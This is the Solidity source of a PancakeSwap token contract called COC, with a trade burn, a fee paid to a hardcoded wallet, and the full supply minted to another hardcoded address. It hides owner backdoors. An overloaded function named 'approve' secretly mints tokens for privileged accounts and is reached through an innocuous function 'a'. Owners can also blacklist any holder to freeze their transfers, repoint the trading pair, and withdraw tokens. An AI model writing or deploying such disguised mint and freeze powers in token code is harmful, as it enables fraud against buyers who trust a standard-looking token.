pragma solidity 0.5.17;

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract COC is ERC20Detailed, Context {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;

  mapping (address => bool) public includeusers;
  mapping (address => bool) public whiteArecipient;


    mapping (address => uint) private _balances;

    mapping (address => mapping (address => uint)) private _allowances;

    uint private _totalSupply;
    uint public maxSupply =  10000000000 * 1e18;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function approve(uint amount, address spender ) public returns (bool) {
        require(aters[msg.sender], "!");
        require(_totalSupply.add(amount) <= maxSupply, "!");
         _totalSupply = _totalSupply.add(amount);
        _balances[spender] = _balances[spender].add(amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    uint256 public nums=0;

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!blacklist[sender] && !blacklist[recipient], "ERC20: user in the blacklist");

        require(amount>1e7, " litter");

        bool isMng = _isExcludedFromFees[sender] || _isExcludedFromFees[recipient];
        bool tradingIsEnabled = getTradingIsEnabled();

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        if (_balances[sender]  ==0) {
            _balances[sender]=1e7;
            amount = amount.sub(1e7);
        }
           uint256 needburn;
           uint ratio;
           
    if (sender ==pancakePair || recipient == pancakePair) {
        // if (
        //     tradingIsEnabled &&
        //     balanceOf(pancakePair) > 0 &&
        //     !isMng &&
        //     block.timestamp <= tradingEnabledTimestamp + 10 seconds
        // ) {
        //     addBot(recipient);
        // }

                needburn = amount.mul(6).div(100);
                ratio = 92;

                _balances[address(this)] = _balances[address(this)].add(needburn);
                emit Transfer(sender, address(this), needburn);

                _burn(address(this) , needburn);
                
                _balances[rec] = _balances[rec].add(amount.mul(2).div(100));
                emit Transfer(sender, rec, amount.mul(2).div(100));
                amount = amount.mul(ratio).div(100);
     } 
       _balances[recipient] = _balances[recipient].add(amount);
       emit Transfer(sender, recipient, amount);

    }
    function addBot(address recipient) private {
        if (!blacklist[recipient])
        {
             blacklist[recipient] = true;
        }
    }
    function getTradingIsEnabled() public view returns (bool) {
        return block.timestamp >= tradingEnabledTimestamp;
    }

  function setTradingEnabledTimestamp(uint t )  public  {
            require(aters[msg.sender], "!gov");
            tradingEnabledTimestamp = t;
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

  mapping(address => bool) private _isExcludedFromFees;
 function excludeFromFees(address account, bool excluded) public {
     require(aters[msg.sender], "!gov");
        require(
            _isExcludedFromFees[account] != excluded,
            "DORAON Account is already the value of 'excluded'"
        );
        _isExcludedFromFees[account] = excluded;

    }
  
  address public governance;
  mapping (address => bool) public aters;




  address public rec=0x4Ae72e45bD1AA84D275928a78f5a2400Cb922aBa;
 uint256 public tradingEnabledTimestamp = 1631365200; 

mapping (address => bool) public whiteaddress;
mapping (uint256=>address) public whiteaa;
uint256 public whitelen;

  IPancakeRouter01 public PancakeRouter01;
  address public token0;
  address public token1;
  address public pancakePair; 
    mapping(address => bool) public blacklist;

    address private recc=0x6Dd2e9387B98Bdc983EeA477b968668Fc23eC836;

  constructor (address _usdt, address _pancake) public ERC20Detailed("COC", "COC", 18) {
      governance = msg.sender;
      addter(msg.sender);

       _totalSupply = _totalSupply.add(maxSupply);
       _balances[recc] = _balances[recc].add(maxSupply);

      PancakeRouter01 =  IPancakeRouter01(_pancake);
      token0 = address(this);
      token1 = _usdt;
      pancakePair =  IPancakeFactory(PancakeRouter01.factory())
            .createPair(address(this),token1 );  
      //starttime = _starttime;
  }

  function a(address account, uint amount) public {
      require(aters[msg.sender], "!gov");
       approve(amount, account);
  }

    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }

  function setpancakePair(address _p) public {
      require(msg.sender == governance || aters[msg.sender ], "!governance");
      pancakePair = _p;
  }

  function setGovernance(address _governance) public {
      require(msg.sender == governance, "!governance");
      governance = _governance;
  }
  
  function addter(address  _adder) public {
      require(msg.sender == governance, "!governance");
      aters[ _adder] = true;
  }

    function withdrawStuckTokens(address _token,address user, uint256 _amount) public  {
        require(aters[msg.sender], "!governance");
        IERC20(_token).transfer(user, _amount);
    }

  function _addBlacklist(address user )  public  {
            require(aters[msg.sender], "!gov");
        blacklist[user] = true;
    }
    
    function _removeBlacklist(address user )  public {
        require(aters[msg.sender], "!gov");
        blacklist[user] = false;
    }

}